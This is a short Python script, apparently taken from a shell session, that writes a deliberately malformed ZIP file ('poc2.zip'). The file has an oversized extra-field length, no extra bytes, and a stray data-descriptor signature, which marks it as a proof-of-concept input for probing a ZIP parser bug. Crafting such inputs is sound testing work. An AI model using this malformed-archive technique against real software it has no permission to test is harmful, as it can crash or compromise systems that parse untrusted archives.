from pathlib import Path
p=Path('/workspace/poc2.zip')
# local header with gpf bit 3 set, extralen huge, no extra bytes, then PK\x07\x08 signature and short data descriptor-ish bytes
b=bytearray()
b += b'PK\x03\x04'
b += b'\x14\x00'  # version needed
b += b'\x08\x00'  # gpf bit 3
b += b'\x00\x00'  # compression none
b += b'\x00\x00\x00\x00'  # mtime/date
b += b'\x00\x00\x00\x00'  # crc
b += b'\x00\x00\x00\x00'  # csize
b += b'\x00\x00\x00\x00'  # usize
b += b'\x04\x00'  # name len
b += b'\xff\xff'  # extra len huge
b += b'AAAA'
b += b'PK\x07\x08'
b += b'BBBBBBBB'
p.write_bytes(b)
print(len(b))
PY
